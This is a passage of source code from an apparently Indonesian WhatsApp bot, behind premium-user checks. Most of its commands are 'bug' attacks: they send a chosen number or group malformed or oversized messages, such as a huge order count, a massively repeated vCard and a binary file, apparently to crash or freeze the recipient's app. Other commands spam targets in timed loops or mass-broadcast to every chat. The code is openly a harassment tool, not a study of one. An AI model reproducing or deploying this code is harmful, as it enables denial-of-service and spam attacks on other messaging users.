"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:rikibos\nitem1.TEL;waid=6287741097274:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳WhatsApp\nX-WA-BIZ-NAME:rikibos\nEND:VCARD",
}
}), { userJid: m.chat, quoted: doc })
rikibos.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
break
//=================================================//
case 'livelokasi': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./rikilah/image/rikgans.jpg') }, { upload: rikibos.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
rikibos.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
break
case 'buglokasi': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./rikilah/image/rikgans.jpg') }, { upload: rikibos.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
						"degreesLatitude": -6.936928157735237,
						"degreesLongitude": 107.72270679473877,
						"caption": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
						"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
rikibos.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
break
//=================================================//
case 'buginvite': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./rikilah/image/rikgans.jpg') }, { upload: rikibos.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"groupName": `MY NAME 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
rikibos.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
break
//=================================================//
case 'troli': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./rikilah/image/rikgans.jpg') }, { upload: rikibos.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "594071395007984",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./rikilah/image/pict.jpg'),
"orderTitle": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"sellerJid": "6287741097274@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
rikibos.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
//=================================================//
case 'catalog': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./rikilah/image/rikgans.jpg') }, { upload: rikibos.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"description": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
"currencyCode": "IDR",
"footerText": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 WE ARE NOT MASTOD`,
"url": "www.instagram.com/ryarllh_01/"
},
"businessOwnerJid": "6287741097274@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc })
rikibos.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
case 'catalogpc': case 'cataloggc':  {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./rikilah/image/rikgans.jpg') }, { upload: rikibos.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"description": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
"currencyCode": "IDR",
"footerText": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 WE ARE NOT MASTOD`,
"url": "www.instagram.com/ryarllh_01/"
},
"businessOwnerJid": "6287741097274@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc})
rikibos.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
reply(tekteka)
}
break
//=================================================//
/*BUG WACAP */
case 'ampas1' : {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await rikibos.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
}
break
//=================================================//
/*BUG WACAP */
case 'ampas2' : {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
if (!isPrem) return replyPremium(mess.premium)

Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await rikibos.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "Xd"}, {quoted: a})
await sleep(10000)
}
break
//=================================================//
case 'gasdek': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
if (!isPrem) return replyPremium(mess.premium)

let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
reply(`${m.pushName} Hello Saya Bot RIK BOT${text ? ': ' + text : ''}`)
}
break
//=================================================//
case 'bugstik':{
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku rikibos`
for (let i = 0; i < jumlah; i++) {
rikibos.sendMessage(m.chat, {sticker: thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
m.reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//=================================================//
case 'bugie':{
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
for (let i = 0; i < jumlah; i++) {
rikibos.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Ao-LpakpZ8JjFGz4skkurYum29b6Q1YPugTEBTAUkhfE.enc",
"mimetype": "application/msword",
"title": "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳",
"fileSha256": "k0tpoRSf/e9AqL1vH2AhxOtqOkJJWz9s2DM7vnuylcQ=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "S6WPcsH25ggZ4tDI813ZocjDm2rc+UPBgaCc+vcw0vo=",
"fileName": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"fileEncSha256": "tpHJ7AgNj61qLebHRonqtpkxphMviV13IprX63dHM64k=",
}
}
}})
}
bal(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//=================================================//
case 'bugbcimage': case 'bugbcvideo': case 'bugbcaudio': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)

if (!/video/.test(mime) && !/image/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`
let anu = await store.chats.all().map(v => v.id)
let doc ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fs.readFileSync('./rikilah/image/pict.jpg'), surface: 200, message: `ZIM-BOT-INC`, orderTitle: '𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
m.reply(`*Send Broadcast To* ${anu.length} *Group Chat, Time ${anu.length * 1.5} minutes*`)
for (let i of anu) {
await sleep(1500)
let butoon = [{
urlButton: {
displayText: `GITHUB`,
url: 'https://www.instagram.com/ryarllh_01/'
}
},
{
quickReplyButton: {
displayText: 'ALL MENU',
id: 'allmenu'
}
}]
let media = await rikibos.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
if (/webp/.test(mime)) {
rikibos.sendMessage(i, { sticker: { url: media } }, { quoted: doc })
} else if (/image/.test(mime)) {
let junn = `*_BROADCAST IMAGE_*${text ? '\n\n' + text : ''}`
rikibos.send5ButImg(i, junn, `${global.botname}`, buffer, butoon)
} else if (/video/.test(mime)) {
let junn = `*_BROADCAST VIDIO_*${text ? '\n\n' + text : ''}`
rikibos.sendMessage(i, {video: buffer, caption: `${junn}`}, { quoted: doc })
} else if (/audio/.test(mime)) {
rikibos.sendMessage(i, {audio: buffer, mimetype: 'audio/mpeg'}, { quoted : doc })
} else {
m.reply(`*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`)
}
await fs.unlinkSync(media)
}
m.reply(` *Send Broadcast To* ${anu.length} *Chats*`)
}
break
//=================================================//
case 'bugbctext': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
if (!text) throw `*Type some text*\n\nExample : ${prefix + command} rikbos`

let doc = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© ${botname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${rikibos.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await getBuffer(picak+'Brodcast'), thumbnail: await getBuffer(picak+'Brodcast'),sendEphemeral: true}}}
let anu = await store.chats.all().map(v => v.id)
m.reply(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
for (let yoi of anu) {
await sleep(1500)
rikibos.sendMessage(yoi, {text:`${text}`}, {quoted:doc})
}
m.reply('*Success Broadcast*')
}
break
//=================================================//
case 'buttonampas':
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
const buttons = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]

const buttonMessage = {
text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳",
footerText: 'Pe',
buttons: buttons,
headerType: 1
}
rikibos.sendMessage(m.chat, buttonMessage)
 break
//=================================================//
case 'bugtag': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
rikibos.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: doc })
}
break
case 'hiya':{
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
if (!isPrem) return replyPremium(mess.premium)

anuin = fs.readFileSync('./rikilah/sound/ngeselin.BIN')
rikibos.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 ${ngazap(prefix)}.BIN`, title: `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 ${ngazap(prefix)}.BIN` }, { quoted: doc })
}
break
//=================================================//
case 'bugtod': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳\nitem1.TEL:+6287741097274\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 